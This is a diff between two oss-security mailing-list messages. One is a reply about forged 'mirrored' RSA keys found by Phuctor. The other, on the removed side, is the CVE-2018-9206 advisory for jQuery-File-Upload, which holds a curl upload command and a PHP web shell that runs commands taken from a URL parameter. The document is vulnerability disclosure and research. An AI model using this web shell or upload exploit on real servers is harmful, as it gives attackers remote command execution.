@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1763" "Saturday" "13" "October" "2018" "22:11:41" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<270DF5EF-8FE1-486A-B15B-BC117769E4D8@me.com>" "56" "Re: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability" nil nil nil "10" "2018101402:11:41" "[oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability" (number mark "U       larry0@me.co Oct 13   56/1763  " thread-indent "\"Re: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability\"\n") "<70dba524-20af-4af3-9c45-698d762e1a4a@me.com>" ("<70dba524-20af-4af3-9c45-698d762e1a4a@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6616" "Wednesday" "4" "May" "2016" "21:18:26" "-0400" "Stanislav Datskovskiy" "stas@loper-os.org" "<CAP9m6YeT=Vo1WQ4Jqn1QV-Cp6mBQ3EwWQ5p_=Rm4P3Na3aGcGw@mail.gmail.com>" "147" "Re: [oss-security] broken RSA keys" "^Date:" nil nil "5" "2016050501:18:26" "[oss-security] broken RSA keys" (number mark "        stas@loper-o May  4  147/6616  " thread-indent "\"Re: [oss-security] broken RSA keys\"\n") "<20160504172803.GA19393@openwall.com>" ("<20160504124248.GA15148@openwall.com>" "<20160504172803.GA19393@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 26174 invoked by uid 550); 14 Oct 2018 02:11:57 -0000
+Received: (qmail 13811 invoked by uid 550); 5 May 2016 03:41:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,90 +11,191 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 28454 invoked from network); 5 May 2016 01:18:37 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:sender:in-reply-to:references:date:message-id:subject
+         :from:to:content-transfer-encoding;
+        bh=6ziUU/xlUlAujRmFsbyS9E2IqN1CbpGH45udIAOCxdg=;
+        b=kZWKgroT6PVadRH4wj6q273H4d5aKO8ALvE4SzlboaKqydvcmVRNJLvFoICiYCJn8n
+         Okr7vcwCb9NgQ/62satp1C5snzh0MT3c6lb0ot+EQa8a4v8Mdf2n3qXmBHnEBRTtu9nS
+         jzHb6hkANqAIXd5nUssifr5FqpN4lrx2yAhGEAiJaukLNEfihRSbUirIXus2++vIXOgc
+         NvPHzf6QDCh/ORboHpSfzOVhH6aUhlV4jq1Wda4i9Ctm98x8MdcyLnhWc5dbDOXwpJFA
+         KnDNr6+F6wEIeimkpXhDM9q2Qeu/wNRo+Bxr/reGqT5+asQ6VGHdnzchAmzTHM5veLTV
+         avfg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:sender:in-reply-to:references:date
+         :message-id:subject:from:to:content-transfer-encoding;
+        bh=6ziUU/xlUlAujRmFsbyS9E2IqN1CbpGH45udIAOCxdg=;
+        b=XXaJMYWeSaKmjxq7UpVr5f6rZgRwJvVY/hM2HBvKJBNVMaXcT4IgYSQBLNqYgVY0B/
+         SUb6J4j796v6lQ0h3cy3VKYzbGJBSbWyAkR3bdp1gL5qnKu3ytR35wo3AQWKjnMgbVNb
+         eBQWz3miFb7A75nI0Kw0aFWRNmQYGOoEe3oRxVgCMGj3ntV7mLUvYcsBIU50s159g/1O
+         33Etw4AChaTGdQuSyKCd6ltFNRnwCa52WsDnOVaKx0PyB2ORh1Cau0I6AuKzcepDeIeG
+         GFest9xJL4+bltF/xxvyw5QQuZONG/FSysVxzK/AnYlXyenpIGGcU+T8TEpFh9t4USkI
+         B9cA==
+X-Gm-Message-State: AOPr4FWymdPJcxr1FBlcTXRxy3m3A/CWmqQ6qjIpVJbdYhjbYEIEJnW1h309kHfAx2X1yQN46PwxBqdcQdbeLA==
+MIME-Version: 1.0
+X-Received: by 10.195.31.130 with SMTP id km2mr10628208wjd.86.1462411106184;
+ Wed, 04 May 2016 18:18:26 -0700 (PDT)
+In-Reply-To: <20160504172803.GA19393@openwall.com>
+References: <20160504124248.GA15148@openwall.com>
+	<20160504172803.GA19393@openwall.com>
+X-Google-Sender-Auth: pzwKSY5P_sbxpp6DPifd2brw-Fw
+Message-ID: <CAP9m6YeT=Vo1WQ4Jqn1QV-Cp6mBQ3EwWQ5p_=Rm4P3Na3aGcGw@mail.gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 4 May 2016 21:18:26 -0400
+From: Stanislav Datskovskiy <stas@loper-os.org>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26154 invoked from network); 14 Oct 2018 02:11:56 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
-	t=1539483103; bh=6RKlHCoKjlM7o8GnR+jcck5Sv1D6sw6BfO9k7U5dkhU=;
-	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
-	b=WcgEP7vrGlpPW0Yb/ctocxEayORrDO9gFMGm9/T/7Cgr9oRd5nRq0nqEzwjFRy3m2
- C50ddNenbgvFQPUsL6UfNowDLTFHqjE5+xKp43jijtRoqM5MnjrJ9CamZ03FQxxLaL
- B7yDBO9iKzB/lWWyprYO+YVW5Skt6MjwmXb183R8N5NreoLVY+Tg7QhE9uzL8N6qsO
- 75qrOQa+phzSsQxcZbFpb2Z/XJq+VP5K/5B2xeRtJdZVmTvFF7IrgCHEjBPu/TqaOU
- /wpUSjhUAkO6CRNvR0HcfGos0Yffayvz0iYK/LLB6TKSkA4A0ff8izXCzmh4wu1OyT
- fVrK2yqKNNyAQ==
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
- malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
- mlxlogscore=879 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1807170000 definitions=main-1810140018
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
- definitions=2018-10-14_02:,, signatures=0
-User-Agent: Microsoft-MacOutlook/10.11.0.180909
-Date: Sat, 13 Oct 2018 22:11:41 -0400
-From: "Larry W. Cashdollar" <larry0@me.com>
-To: Open Security <oss-security@lists.openwall.com>
-Message-id: <270DF5EF-8FE1-486A-B15B-BC117769E4D8@me.com>
-Thread-topic: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated
- arbitrary file upload vulnerability
-References: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
-In-reply-to: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
-MIME-version: 1.0
-Content-type: multipart/alternative; boundary=B_3622313503_1974825838
-Subject: Re: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated
- arbitrary file upload vulnerability
+Sender: datskovs@gmail.com
+Subject: Re: [oss-security] broken RSA keys
+To: oss-security@lists.openwall.com
 
---B_3622313503_1974825838
-Content-type: text/plain;
-	charset="UTF-8"
-Content-transfer-encoding: 7bit
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
 
-Hello All,
+Author of Phuctor speaking.  I would like to point out that there is a
+'contact' button on the site, anyone who wishes can click and ask
+questions in real time.  Readers are encouraged to do this!
 
- 
+A few observations of possible interest to the folks on this list:
 
-This has been fixed in v9.22.1.
+1) We presently know of 165 keys containing 'mirrored' moduli.
+They, and the process whereby they were found in an SKS dump, even
+prior to being properly 'phuctored', can be seen at
+http://trilema.com/2015/more-factored-rsa-keys-and-assorted-other-considera=
+tions
+=2E
 
- 
+2) The list of affected persons and organizations includes a number of
+possibly 'politically interesting' targets, e.g., mathematicians, open
+source projects (Debian, a few others), plus a few other delicacies,
+such as 'Apple Product Security', 'PGP Corporation Update Signing
+Key', etc.
 
-Larry
+3) The 'mirrored' keys found thus far in no case have valid
+self-signatures. (A number of the remaining phuctored keys - do.) Thus
+it does not follow from the facts at hand that these particular keys
+were generated /by the people and organizations whose names appear in
+the user string/ !
 
-From: "Larry W. Cashdollar" <larry0@me.com>
-Reply-To: Open Security <oss-security@lists.openwall.com>
-Date: Thursday, October 11, 2018 at 12:07 PM
-To: Open Security <oss-security@lists.openwall.com>
-Subject: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
+4) One parsimonious explanation for (1) given (2) and (3) is that the
+'mirrored' keys were generated by a malicious actor, who counted on
+the principle described at, e.g.,  https://evil32.com ,
+https://bugs.gnupg.org/gnupg/issue1579 - whereby older versions of GPG
+will regard the bottom 32 bits of a modulus as the 'fingerprint',
+rather than performing a hash.  The SKS network happily accepts such
+keys, and will list them as search results if the username associated
+with a genuine key is searched for.  PGP/GPG clients which do not
+check a key's self-signatures will happily encipher to a 'mirrored'
+key, and the adversary presumably counted on having access to the
+resulting ciphertext. A program which generates a 'mirrored'
+fraudulent key for any particular public key on SKS can be written
+trivially. (In the interest of not encouraging low-effort hooliganism,
+I have not posted this simple program publicly. It is left as an
+exercise for the reader.)
 
- 
+- -S
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.10 (GNU/Linux)
 
-Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
-Author: Larry W. Cashdollar, @_larry0
-Date: 2018-10-09
-CVE-ID:[CVE-2018-9206]
-Download Site: https://github.com/blueimp/jQuery-File-Upload/
-Vendor: https://github.com/blueimp
-Vendor Notified: 2018-10-09
-Vendor Contact:
-Advisory: http://www.vapidlabs.com/advisory.php?v=204
-Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
-Vulnerability:
-The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.
+iQEcBAEBCgAGBQJXKp8UAAoJELmCKKABq//HnLoH/jo5vxYhasg+7FgZtqQ44dh3
+cxUNit7w41DtIOT93LkEn3ZPw1z1Q8u0qD6RUJKHTUwxYDwkjE2jV9HVV0/n4Pdj
++ma9q7K+1lHV5QOpMvuNl05oakHLTpc5P0iC0T+tULz7gC8Y1UwkUbGcYIunXQT6
+7fTi1z19emSxu9pJtLtfZoRX+7KEGdpdWmX4gIOCS8Gc7YJd2Oco/nzdXwEmpCfn
+Qr+kjGu4SkX4Iy34JDQ54Psy+sNiKP13rifvCKNoMKU4I2sEC/ilxGcj0wSSqvYX
+0J0ZWp9hlHOnonQUre2AyTPDO8hSlmoc2rcqOi7Y10HCpZZeihlT2cODbcbBrXc=3D
+=3Dw4Ox
+-----END PGP SIGNATURE-----
 
 
-Exploit Code:
-$ curl -F "files=@shell.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
-
-Where shell.php is:
-
-<?php 
-
-$cmd=$_GET['cmd']; 
-
-system($cmd);
-
-?>
-Screen Shots:
-Notes: Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514
-
-
---B_3622313503_1974825838--
-
-
+On Wed, May 4, 2016 at 1:28 PM, Solar Designer <solar@openwall.com> wrote:
+> On Wed, May 04, 2016 at 03:42:48PM +0300, Solar Designer wrote:
+>> Additionally, both Phuctor's list and Hanno Bock's list of GCDs include
+>> many small factors that also exhibit 32-bit value duplication.  To me,
+>> this speaks in favor of there being a bignum library bug like this.
+>> A bug that not only duplicates the least significant 32 bits onto the
+>> next 32 bits, but also keeps the rest of the limbs at all-zeroes.  There
+>> are even weirder examples, though - e.g., one of Phuctor's factors is
+>> 0x115CFF61CFECFF61BE9, where we see three 32-bit limbs satisfying:
+>>
+>> limb[1] =3D limb[0] + limb[2]
+>>
+>> and also limb[2] is small and thus likely didn't come from a CSPRNG, but
+>> possibly from uninitialized memory.
+>
+> While the 32-bit duplication of e is probably for real (or those keys
+> wouldn't validate... do they?), similar observations for factors are
+> probably a red herring: an artifact of the process used by these
+> factoring projects rather than part of how the keys were generated.
+>
+> Specifically, the above 3-limb example came from this key:
+>
+> http://phuctor.nosuchlabs.com/gpgkey/63016E43A530350EC983F09A74C50EC8E87F=
+EB92F3DEAC355BE2E64CA7985921
+>
+> Its listed factors for:
+>
+> 3099440630422433370508930102180881705326569160056574577946131919270048217=
+349934690146337332376083710109442229701558591490197515080815702584805552405=
+009966466681847440313804794892129791180967631588015119441798227174053211228=
+027656140606715058027283788946970407860362047460797390116841328432803677511=
+486000300624297803609311458145974229836864555772128383926655097574570623472=
+263652075127903109553098964478479457882013368910257394483098393202231047674=
+002769620463069328506501212412253323105390287646397791418340100112626149627=
+717051015362162867397803889781766159306322259349567968329109629983591255678=
+1797309445223969995
+>
+> are:
+>
+> 15010910703015
+> 5124733305108403985385
+> 149784613473514443594783892995
+>
+> However, this modulus is also divisible by 3, 5, and thus by 15, etc.
+> So what we're seeing in databases like this are just some larger
+> non-prime factors that combine the smaller factors in specific ways.
+> I understand that's not how they were figured out (rather, they're
+> shared factors with other keys), but that's what they happen to be
+> composed of.  Moreover, the larger ones of the factors above are
+> divisible by the smaller ones of them:
+>
+> 5124733305108403985385 / 15010910703015 =3D 341400559
+> 149784613473514443594783892995 / 5124733305108403985385 =3D 29227787
+>
+> So these are pretty much arbitrary, process-dependent combinations of
+> smaller factors, and thus their bit patterns, etc. don't tell us much or
+> anything about the nature of bugs in key generation, if there were any.
+> (I say "if there were any" since the keys could as well have been
+> mangled later.)
+>
+> BTW, had I not realized the above, I would now come up with an even more
+> complex conspiracy theory about 149784613473514443594783892995, which is
+> 0x1E3FAEDA6A4F093A7C0F5A603, so:
+>
+> limb[0] =3D 0xC0F5A603
+> limb[1] =3D 0xA4F093A7
+> limb[2] =3D 0xE3FAEDA6
+> limb[3] =3D 1
+>
+> which satisfies:
+>
+> limb[1] =3D limb[0] + limb[2] + 2
+>
+> No idea why it's "+ 2" here, unlike in the smaller factor's example, but
+> like I say this is just a conspiracy theory, and I think the simple
+> explanation is it's an artifact of the process rather than any inherent
+> property of the keys.
+>
+> Thus, I think it makes sense to focus on searching for bugs producing
+> the 32-bit duplicated e's, after all.  And it also makes sense to
+> validate those keys - not merely rely on data already in these factoring
+> projects' databases.
+>
+> Could it be that all of the broken e keys were generated by OpenSSL from
+> year 2000 or earlier?  Embedded copies in proprietary PGP implementations
+> that have since been rebuilt for 64-bit?  Doesn't sound very realistic,
+> but who knows.
+>
+> Alexander
